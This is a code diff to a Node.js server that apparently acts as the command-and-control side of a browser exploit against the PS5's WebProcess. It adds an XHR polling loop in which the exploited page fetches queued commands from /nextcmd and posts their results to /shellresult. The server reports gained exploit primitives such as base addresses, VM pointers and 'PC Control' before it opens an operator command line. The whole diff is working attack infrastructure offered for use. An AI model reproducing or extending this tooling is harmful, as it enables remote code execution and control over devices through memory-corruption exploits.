@@ -47,6 +47,47 @@ function generateCert() {
 }
 
 function requestHandler(req, res) {
+  /* SHELL XHR FALLBACK: the guide webview's secure WebSocket fails at
+   * transport level (close code 1006, V-session 14:58) while XHR to the
+   * same origin works flawlessly (every beacon proves it). The command
+   * loop rides the same rails: GET /nextcmd -> execute -> POST /shellresult. */
+  if (req.method === 'GET' && req.url.startsWith('/nextcmd')) {
+    if (!pollModeSeen) { pollModeSeen = true; console.log('\n\x1b[32m*** PS5 WebProcess connected (XHR POLL MODE) ***\x1b[0m'); }
+    let body = '{"wait":1}';
+    if (cmdQueue.length > 0) body = JSON.stringify(cmdQueue.shift());
+    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' });
+    res.end(body);
+    return;
+  }
+  if (req.method === 'POST' && req.url.startsWith('/shellresult')) {
+    let data = '';
+    req.on('data', (c) => { data += c; });
+    req.on('end', () => {
+      logBeacon('[RES] ' + data.substring(0, 4000));
+      let msg; try { msg = JSON.parse(data); } catch (e) { msg = null; }
+      if (msg && msg.type === 'ready') {
+        console.log('\n\x1b[1;32m*** PRIMITIVES READY (poll mode) ***\x1b[0m');
+        console.log('  BASE:       ' + msg.base);
+        console.log('  View:       ' + msg.view + ' (' + msg.viewSize + ' bytes)');
+        console.log('  Cell:       ' + msg.cell);
+        console.log('  PC Control: ' + (msg.pcControl ? '\x1b[32mYES\x1b[0m' : '\x1b[33mNO\x1b[0m'));
+        if (msg.jf) console.log('  JSFunction: ' + msg.jf);
+        if (msg.vm) console.log('  VM:         ' + msg.vm);
+        if (msg.cfr) console.log('  cfr:        ' + msg.cfr);
+        if (msg.jfuTop) console.log('  jfuTop:     ' + msg.jfuTop);
+        console.log('\n  Type \x1b[1mhelp\x1b[0m for commands.\n');
+        startCLI();
+        res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok');
+        return;
+      }
+      if (msg && msg.type === 'result' && pendingResolve) {
+        clearTimeout(pendingTimeout);
+        pendingResolve(msg); pendingResolve = null; pendingTimeout = null;
+      }
+      res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok');
+    });
+    return;
+  }
   if (req.method === 'POST' && req.url.startsWith('/beacon/')) {
     const tag = decodeURIComponent(req.url.split('/beacon/')[1]?.split('?')[0] || '');
     logBeacon(tag);
@@ -81,6 +122,8 @@ function requestHandler(req, res) {
 }
 
 let activeWs = null;
+let cmdQueue = [];
+let pollModeSeen = false;
 let cmdId = 0;
 let pendingResolve = null;
 let pendingTimeout = null;
@@ -135,18 +178,17 @@ function setupWss(server) {
 function sendCmd(obj, timeoutMs) {
   timeoutMs = timeoutMs || 30000;
   return new Promise((resolve) => {
-    if (!activeWs || activeWs.readyState !== WebSocket.OPEN) {
-      console.log('\x1b[31mNo active connection\x1b[0m');
-      resolve(null);
-      return;
-    }
     obj.id = ++cmdId;
     logBeacon('[CMD] ' + JSON.stringify(obj));
     pendingResolve = resolve;
     pendingTimeout = setTimeout(() => {
       if (pendingResolve) { pendingResolve({ err: 'timeout' }); pendingResolve = null; }
     }, timeoutMs);
-    activeWs.send(JSON.stringify(obj));
+    if (activeWs && activeWs.readyState === WebSocket.OPEN) {
+      activeWs.send(JSON.stringify(obj));
+    } else {
+      cmdQueue.push(obj);   /* XHR poll mode - the page picks it up on its next /nextcmd poll */
+    }
   });
 }
 
